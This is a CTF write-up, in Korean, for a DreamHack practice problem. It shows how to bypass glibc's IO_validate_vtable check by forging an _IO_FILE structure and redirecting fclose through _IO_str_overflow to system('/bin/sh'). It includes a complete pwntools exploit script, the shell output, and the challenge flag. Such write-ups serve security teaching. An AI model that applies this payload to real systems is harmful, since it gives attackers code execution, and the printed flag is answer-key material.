# [DreamHack] Bypass IO_validate_vtable

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> Exploit Tech: Bypass IO_validate_vtable에서 실습하는 문제입니다.
>
> Release: [Bypass IO_validate_vtable.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8550277/Bypass.IO_validate_vtable.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/102066383/162555785-b5b02c40-0ab8-4caa-8e0b-10d6f248bdb3.png)

## Analysis

```c
FILE *fp;

int main() {
  init();

  fp = fopen("/dev/urandom", "r");

  printf("stdout: %p\n", stdout);
  printf("Data: ");

  read(0, fp, 300);

  fclose(fp);
}
```

출력되는 `stdout`의 값으로 libc 주소를 계산할 수 있다. 그리고 `read(0, fp, 300)`에서 파일 구조체 전체를 덮어쓸 수 있다.

## Exploit

Ubuntu 18.04 환경이므로, 단순히 vtable을 덮는 방법은 사용할 수 없다. vtable check를 우회하기 위해 `_IO_str_overflow()`를 이용하여 익스플로잇을 할 수 있다.

### fclose()

![image](https://user-images.githubusercontent.com/102066383/162556097-c83ac38f-3bea-4a5d-be5f-9f183ee81cde.png)

![image](https://user-images.githubusercontent.com/102066383/162556101-26aaafb4-0134-4c13-ae47-faaaa5d9dcab.png)

`fclose()`는 내부적으로 vtable에 있는 `_IO_new_file_finish()`를 호출한다.

![image](https://user-images.githubusercontent.com/102066383/162556179-6db99b1f-2d45-4286-b63a-3c69589339ad.png)

`_IO_str_overflow()`는 `_IO_new_file_finish()`보다 `0xc8`만큼 뒤쪽에 있으므로, `fp`의 vtable의 값을 원래보다 `0xc8`만큼 큰 값으로 바꾸면 `_IO_str_overflow()`가 대신 호출된다.

### \_IO\_str\_overflow()

```c
int
_IO_str_overflow (_IO_FILE *fp, int c)
{
  int flush_only = c == EOF;
  _IO_size_t pos;
  if (fp->_flags & _IO_NO_WRITES)
      return flush_only ? 0 : EOF;
  if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING))
    {
      fp->_flags |= _IO_CURRENTLY_PUTTING;
      fp->_IO_write_ptr = fp->_IO_read_ptr;
      fp->_IO_read_ptr = fp->_IO_read_end;
    }
  pos = fp->_IO_write_ptr - fp->_IO_write_base;
  if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))
    {
      if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */
	return EOF;
      else
	{
	  char *new_buf;
	  char *old_buf = fp->_IO_buf_base;
	  size_t old_blen = _IO_blen (fp);
	  _IO_size_t new_size = 2 * old_blen + 100;
	  if (new_size < old_blen)
	    return EOF;
	  new_buf
	    = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);
	  if (new_buf == NULL)
	    {
	      /*	  __ferror(fp) = 1; */
	      return EOF;
	    }
	  if (old_buf)
	    {
	      memcpy (new_buf, old_buf, old_blen);
	      (*((_IO_strfile *) fp)->_s._free_buffer) (old_buf);
	      /* Make sure _IO_setb won't try to delete _IO_buf_base. */
	      fp->_IO_buf_base = NULL;
	    }
	  memset (new_buf + old_blen, '\0', new_size - old_blen);

	  _IO_setb (fp, new_buf, new_buf + new_size, 1);
	  fp->_IO_read_base = new_buf + (fp->_IO_read_base - old_buf);
	  fp->_IO_read_ptr = new_buf + (fp->_IO_read_ptr - old_buf);
	  fp->_IO_read_end = new_buf + (fp->_IO_read_end - old_buf);
	  fp->_IO_write_ptr = new_buf + (fp->_IO_write_ptr - old_buf);

	  fp->_IO_write_base = new_buf;
	  fp->_IO_write_end = fp->_IO_buf_end;
	}
    }

  if (!flush_only)
    *fp->_IO_write_ptr++ = (unsigned char) c;
  if (fp->_IO_write_ptr > fp->_IO_read_end)
    fp->_IO_read_end = fp->_IO_write_ptr;
  return c;
}
```

타겟은 `new_buf = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size)` 부분이다. `fp->_s._allocate_buffer`에 `system()`의 주소를 넣고 `new_size`에 `"/bin/sh"`의 주소를 넣으면 `system("/bin/sh")`가 호출되어 셸을 획득할 수 있다.

그렇게 하기 위해서는 몇 가지 조건을 맞춰주어야 한다.

- `if (fp->_flags & _IO_NO_WRITES)`의 조건이 참이 되면 `return flush_only ? 0 : EOF;`가 실행되므로 플래그의 `_IO_NO_WRITES`(`0x8`) 비트는 설정되어 있지 않아야 한다.

- `if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))`의 조건이 참이 되어야 한다. `pos`는 `pos = fp->_IO_write_ptr - fp->_IO_write_base`로 정의되고, `_IO_blen(fp)`는 `#define _IO_blen(fp) ((fp)->_IO_buf_end - (fp)->_IO_buf_base)`로 정의되고, `flush_only`는 `int flush_only = c == EOF`로 0 또는 1이 된다. 즉, `fp->_IO_write_ptr - fp->_IO_write_base >= fp->_IO_buf_end - fp->_IO_buf_base + 1`이 참이 되어야 한다.

- `if (fp->_flags & _IO_USER_BUF)`의 조건이 참이 되면 `return EOF;`가 실행되므로 플래그의 `_IO_USER_BUF`(`0x1`) 비트는 설정되어 있지 않아야 한다.

- `new_size`는 `"/bin/sh"`의 주소가 되어야 한다. `_IO_size_t new_size = 2 * _IO_blen(fp) + 100`로 `new_size`의 값이 결정되므로, `fp->_IO_buf_end`와 `fp->_IO_buf_base`를 잘 맞춰서 넣어주면 된다.

- `fp->_s._allocate_buffer`의 위치는 구조체를 보면 알 수 있다.

  ```c
  struct _IO_streambuf
  {
    struct _IO_FILE _f;
    const struct _IO_jump_t *vtable;
  };
  
  typedef struct _IO_strfile_
  {
    struct _IO_streambuf _sbf;
    struct _IO_str_fields _s;
  } _IO_strfile;
  
  struct _IO_str_fields
  {
    _IO_alloc_type _allocate_buffer;
    _IO_free_type _free_buffer;
  };
  ```

  즉, `vtable`의 바로 다음에 인접해 있다. 이 위치에 `system()`의 주소를 넣으면 된다.

위의 조건들을 만족하도록 파일 구조체를 조작하면 셸을 획득할 수 있다.

### Full exploit

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('/home/bypass_valid_vtable/bypass_valid_vtable')
    stdout_offset = 0x3ec760
    system_offset = 0x4f420
    binsh_offset = 0x1b3d88
    vtable_offset = 0x3e82a0
else:
    r = remote('host1.dreamhack.games', 10755)
    stdout_offset = 0x3ec760
    system_offset = 0x4f440
    binsh_offset = 0x1b3e9a
    vtable_offset = 0x3e82a0

bss = 0x601080  # empty bss buffer


# leak libc

r.recvuntil('stdout: 0x')
stdout = int(r.recvline()[:-1], 16)  # _IO_2_1_stdout_
libc = stdout - stdout_offset  # libc base
system = libc + system_offset  # system()
binsh = libc + binsh_offset  # "/bin/sh"
vtable = libc + vtable_offset  # _IO_file_jumps


# overwrite _IO_FILE structure

payload = p64(0xfbad0000)  # _flags
payload += p64(0)  # _IO_read_ptr
payload += p64(0)  # _IO_read_end
payload += p64(0)  # _IO_read_base
payload += p64(0)  # _IO_write_base
payload += p64(binsh)  # _IO_write_ptr
payload += p64(0)  # _IO_write_end
payload += p64(0)  # _IO_buf_base
payload += p64(int((binsh - 100) / 2))  # _IO_buf_end
payload += p64(0) * 5
payload += p32(3)  # _fileno
payload += p32(0)  # _flags2
payload += p64(0) * 2
payload += p64(bss)  # _lock
payload += p64(0) * 9
payload += p64(vtable + 0xc8)
payload += p64(system)

r.sendafter('Data: ', payload)


r.interactive()
```

```
$ python3 solve.py
[+] Opening connection to host1.dreamhack.games on port 10755: Done
[*] Switching to interactive mode
$ cat flag
DH{88f488e0a977c64f4bb355d7a48e6623}
```